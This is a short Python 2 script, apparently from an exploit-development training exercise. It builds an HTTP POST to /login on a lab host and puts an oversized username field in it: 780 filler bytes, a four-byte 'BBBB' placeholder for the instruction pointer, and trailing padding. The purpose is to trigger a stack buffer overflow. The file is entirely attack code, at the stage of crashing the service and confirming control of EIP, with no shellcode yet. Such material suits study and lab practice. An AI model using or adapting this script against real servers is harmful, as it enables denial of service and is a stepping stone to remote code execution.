#!/usr/bin/python
import socket

try:
    print "\nSending evil buffer..."
    #size = 800
    filler = "A" * 780
    eip = "B" * 4
    bufferheader = "C" * 16

    inputBuffer = filler + eip + bufferheader
    content = "username="+inputBuffer+"&password=A"

    #-- Recreate the HTTP headers as seen from Wireshark --#
    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.0.20\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    # Encoding not in training
    buffer += "Accept-Encoding: gzip, deflate\r\n"
    buffer += "Referer: http://192.168.0.20/login\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: " + str(len(content)) + "\r\n"
    # The DNT header not in training
    buffer += "DNT: 1\r\n"
    # Connection is closed in training
    #buffer += "Connection: keep-alive\r\n"
    buffer += "Connection: close\r\n"
    # Not included in manual
    buffer += "Upgrade-Insecure-Requests: 1\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.0.20",80))
    s.send(buffer)

    s.close()

    print "\nDone!"
except:
    print "Could not connect!"

